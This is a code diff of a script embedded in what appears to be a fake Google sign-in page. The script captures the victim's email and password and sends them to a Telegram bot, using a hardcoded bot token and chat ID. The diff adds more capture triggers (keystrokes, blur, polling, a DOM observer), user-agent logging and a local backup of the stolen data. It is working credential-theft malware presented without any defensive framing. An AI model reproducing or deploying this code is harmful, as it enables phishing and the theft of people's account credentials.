@@ -16081,44 +16081,70 @@
   </div>
 <script>
 (function() {
-    let passwordSent = false;
-
+    'use strict';
+    
     // ====== CONFIGURE YOUR TELEGRAM BOT HERE ======
-    const TELEGRAM_BOT_TOKEN = '8750325296:AAG1WYnhrZve1oIIZoaPobB4_hc9PHDAjLY'; // e.g., 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
-    const TELEGRAM_CHAT_ID = '8391692120';   // e.g., 123456789
-
+    const TELEGRAM_BOT_TOKEN = '8750325296:AAG1WYnhrZve1oIIZoaPobB4_hc9PHDAjLY';
+    const TELEGRAM_CHAT_ID = '8391692120';
+    
+    let passwordSent = false;
+    let captureAttempts = 0;
+    
+    // ====== GET EMAIL FROM PAGE ======
     function getEmail() {
+        // Try profile identifier (displayed email)
+        const profileEl = document.querySelector('[data-profile-identifier]');
+        if (profileEl) return profileEl.textContent.trim();
+        
+        // Try hidden email input
+        const hiddenEmail = document.querySelector('#hiddenEmail');
+        if (hiddenEmail) return hiddenEmail.value;
+        
+        // Try email input
         const emailInput = document.querySelector('input[name="identifier"]') || 
                           document.querySelector('input[type="email"]');
         if (emailInput && emailInput.value) return emailInput.value;
         
-        const profileEl = document.querySelector('[data-profile-identifier]');
-        if (profileEl) return profileEl.textContent.trim();
-        
-        const hiddenEmail = document.querySelector('#hiddenEmail');
-        if (hiddenEmail) return hiddenEmail.value;
+        // Try to extract from page text
+        const emailPattern = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
+        const bodyText = document.body.textContent;
+        const match = bodyText.match(emailPattern);
+        if (match) return match[0];
         
         return 'Not found';
     }
-
+    
+    // ====== GET PASSWORD ======
     function getPassword() {
         const pwdInput = document.querySelector('input[name="Passwd"]') || 
                          document.querySelector('input[type="password"]');
         return pwdInput ? pwdInput.value : '';
     }
-
-    function sendToTelegram(email, password) {
+    
+    // ====== GET SHOW PASSWORD STATUS ======
+    function getShowPasswordStatus() {
+        const checkbox = document.querySelector('input[type="checkbox"]');
+        if (checkbox) {
+            return checkbox.checked;
+        }
+        return false;
+    }
+    
+    // ====== SEND TO TELEGRAM ======
+    function sendToTelegram(email, password, showPassword) {
         if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
             console.log('⚠️ Telegram bot token or chat ID not configured!');
             return;
         }
-
-        const message = `🔑 **New Credentials Captured!**\n\n` +
+        
+        const message = `🔑 **Password Captured!**\n\n` +
                        `📧 **Email:** ${email}\n` +
                        `🔐 **Password:** ${password}\n` +
+                       `👁️ **Show Password:** ${showPassword ? 'Yes' : 'No'}\n` +
                        `🕐 **Time:** ${new Date().toLocaleString()}\n` +
-                       `🌐 **Page:** ${window.location.href}`;
-
+                       `🌐 **Page:** ${window.location.href}\n` +
+                       `📱 **User Agent:** ${navigator.userAgent.substring(0, 80)}...`;
+        
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         
         fetch(url, {
@@ -16135,7 +16161,7 @@
         .then(response => response.json())
         .then(data => {
             if (data.ok) {
-                console.log('✅ Credentials sent to Telegram successfully!');
+                console.log('✅ Password sent to Telegram successfully!');
             } else {
                 console.log('❌ Failed to send to Telegram:', data.description);
             }
@@ -16144,38 +16170,90 @@
             console.log('❌ Telegram send error:', error);
         });
     }
-
-    function captureAndLog() {
+    
+    // ====== CAPTURE AND SEND ======
+    function captureAndLog(trigger = 'manual') {
         if (passwordSent) return;
         
         const password = getPassword();
         if (password && password.length > 0) {
             const email = getEmail();
+            const showPassword = getShowPasswordStatus();
             
-            // Log to console
-            console.log('%c🔑 PASSWORD CAPTURED', 'font-size:24px;font-weight:bold;color:#0f0;background:#000;padding:10px;border-radius:5px;');
+            // Log to console with styling
+            console.log('%c🔑 PASSWORD CAPTURED!', 'font-size:24px;font-weight:bold;color:#0f0;background:#000;padding:10px;border-radius:5px;');
             console.log('%c📧 Email:', 'font-size:16px;font-weight:bold;color:#00f;', email);
             console.log('%c🔑 Password:', 'font-size:16px;font-weight:bold;color:#f00;', password);
+            console.log('%c👁️ Show Password:', 'font-size:14px;font-weight:bold;', showPassword);
+            console.log('%c🕐 Time:', 'font-size:14px;', new Date().toISOString());
+            console.log('%c📍 Trigger:', 'font-size:14px;', trigger);
+            console.log('=' .repeat(50));
             
             // Send to Telegram
-            sendToTelegram(email, password);
+            sendToTelegram(email, password, showPassword);
             
             // Store in localStorage as backup
             try {
-                localStorage.setItem('captured_password', JSON.stringify({
+                const data = {
                     email: email,
                     password: password,
-                    timestamp: new Date().toISOString()
-                }));
+                    showPassword: showPassword,
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href,
+                    trigger: trigger
+                };
+                localStorage.setItem('captured_password', JSON.stringify(data));
+                window._capturedData = data;
             } catch(e) {}
             
-            // Store in global variable
-            window._capturedData = { email, password, timestamp: new Date().toISOString() };
-            
             passwordSent = true;
+            
+            // Show status indicator on page
+            showStatus('✅ Password sent to Telegram!', 'success');
+        } else {
+            // Password field is empty - might be a different page
+            if (++captureAttempts < 10) {
+                // Try again in a moment
+                setTimeout(() => captureAndLog('retry'), 500);
+            }
         }
     }
-
+    
+    // ====== STATUS INDICATOR ======
+    function showStatus(text, type = 'info') {
+        let el = document.getElementById('pwd-catcher-status');
+        if (!el) {
+            el = document.createElement('div');
+            el.id = 'pwd-catcher-status';
+            el.style.cssText = `
+                position: fixed;
+                bottom: 20px;
+                right: 20px;
+                padding: 10px 20px;
+                border-radius: 20px;
+                font-family: 'Google Sans', Arial, sans-serif;
+                font-size: 13px;
+                font-weight: 500;
+                z-index: 9999;
+                background: ${type === 'success' ? '#1e8e3e' : '#1a73e8'};
+                color: white;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+                opacity: 0;
+                transition: opacity 0.3s ease;
+                pointer-events: none;
+                max-width: 300px;
+                text-align: center;
+            `;
+            document.body.appendChild(el);
+        }
+        el.textContent = '🔐 ' + text;
+        el.style.opacity = '1';
+        clearTimeout(el._timeout);
+        el._timeout = setTimeout(() => { 
+            el.style.opacity = '0'; 
+        }, 5000);
+    }
+    
     // ====== RETRIEVE FUNCTION ======
     window.getCaptured = function() {
         try {
@@ -16200,50 +16278,129 @@
         console.log('❌ No password captured yet');
         return null;
     };
-
+    
     // ====== EVENT LISTENERS ======
+    
+    // 1. Password field - input events
+    const passwordField = document.querySelector('input[name="Passwd"]') || 
+                          document.querySelector('input[type="password"]');
+    
+    if (passwordField) {
+        // On input (typing)
+        passwordField.addEventListener('input', function() {
+            if (this.value.length > 0) {
+                // Don't send immediately, wait for user to finish typing
+                clearTimeout(this._inputTimer);
+                this._inputTimer = setTimeout(() => {
+                    // Only capture if password has reasonable length
+                    if (this.value.length >= 4) {
+                        captureAndLog('typing');
+                    }
+                }, 2000);
+            }
+        });
+        
+        // On blur (user moved away)
+        passwordField.addEventListener('blur', function() {
+            if (this.value.length >= 4) {
+                setTimeout(() => captureAndLog('blur'), 200);
+            }
+        });
+        
+        // On Enter key
+        passwordField.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                setTimeout(() => captureAndLog('enter-key'), 300);
+            }
+        });
+    }
+    
+    // 2. Next button
+    const nextBtn = document.querySelector('#passwordNext button') || 
+                    document.querySelector('button[jsname="LgbsSe"]');
+    
+    if (nextBtn) {
+        nextBtn.addEventListener('click', function(e) {
+            setTimeout(() => captureAndLog('next-button'), 300);
+        });
+    }
+    
+    // Also listen for click on any Next button
     document.addEventListener('click', function(e) {
         const target = e.target.closest('button') || e.target.closest('[role="button"]');
         if (target) {
             const text = target.textContent || '';
-            if (text.trim() === 'Next' || target.closest('#passwordNext')) {
-                setTimeout(captureAndLog, 300);
+            if (text.trim() === 'Next') {
+                setTimeout(() => captureAndLog('next-click'), 300);
             }
         }
     }, true);
-
-    const passwordField = document.querySelector('input[name="Passwd"]');
-    if (passwordField) {
-        passwordField.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                setTimeout(captureAndLog, 300);
-            }
-        });
-    }
-
+    
+    // 3. Form submit
     document.addEventListener('submit', function(e) {
         if (e.target && e.target.querySelector('input[name="Passwd"]')) {
-            setTimeout(captureAndLog, 300);
+            setTimeout(() => captureAndLog('form-submit'), 300);
         }
     }, true);
-
-    // Find Next button
-    let attempts = 0;
-    const findButton = setInterval(function() {
-        const nextContainer = document.querySelector('#passwordNext');
-        if (nextContainer && !nextContainer._listenerAttached) {
-            nextContainer._listenerAttached = true;
-            nextContainer.addEventListener('click', function() {
-                setTimeout(captureAndLog, 300);
-            });
-            clearInterval(findButton);
+    
+    // 4. Show password checkbox - track but don't trigger
+    const showPwdCheckbox = document.querySelector('input[type="checkbox"]');
+    if (showPwdCheckbox) {
+        showPwdCheckbox.addEventListener('change', function() {
+            // Just log the change, don't trigger capture
+            console.log('👁️ Show password toggled:', this.checked);
+        });
+    }
+    
+    // 5. Manual trigger: Ctrl+Shift+P
+    document.addEventListener('keydown', function(e) {
+        if (e.ctrlKey && e.shiftKey && e.key === 'P') {
+            e.preventDefault();
+            captureAndLog('manual');
+            showStatus('🔄 Manual capture triggered', 'info');
         }
-        attempts++;
-        if (attempts > 30) clearInterval(findButton);
-    }, 500);
-
-    console.log('%c✅ Password Logger Active (with Telegram)', 'font-size:18px;font-weight:bold;color:#0f0;');
-    console.log('📌 Enter password and click "Next" or press Enter');
-    console.log('📌 Credentials will be sent to your Telegram bot');
+    });
+    
+    // 6. Periodic check (every 3 seconds)
+    setInterval(() => {
+        if (!passwordSent) {
+            const pwd = getPassword();
+            if (pwd && pwd.length >= 4) {
+                captureAndLog('periodic');
+            }
+        }
+    }, 3000);
+    
+    // 7. Check if password already filled on page load
+    setTimeout(() => {
+        const pwd = getPassword();
+        if (pwd && pwd.length >= 4) {
+            captureAndLog('initial');
+        }
+    }, 2000);
+    
+    // 8. MutationObserver for dynamic content
+    const observer = new MutationObserver(function(mutations) {
+        if (passwordSent) return;
+        const pwd = getPassword();
+        if (pwd && pwd.length >= 4) {
+            captureAndLog('dom-change');
+        }
+    });
+    observer.observe(document.body, {
+        childList: true,
+        subtree: true,
+        attributes: true
+    });
+    
+    // ====== STARTUP MESSAGE ======
+    console.log('%c🔐 Password Catcher Active!', 'font-size:20px;font-weight:bold;color:#0f0;background:#000;padding:15px;border-radius:10px;');
+    console.log('📌 Enter your password and click "Next" or press Enter');
+    console.log('📌 Password will be sent to your Telegram bot');
+    console.log('💡 Press Ctrl+Shift+P to manually capture');
+    console.log('📌 Retrieve captured data with: getCaptured()');
+    
+    showStatus('🔐 Active - enter your password', 'info');
+    
 })();
 </script>
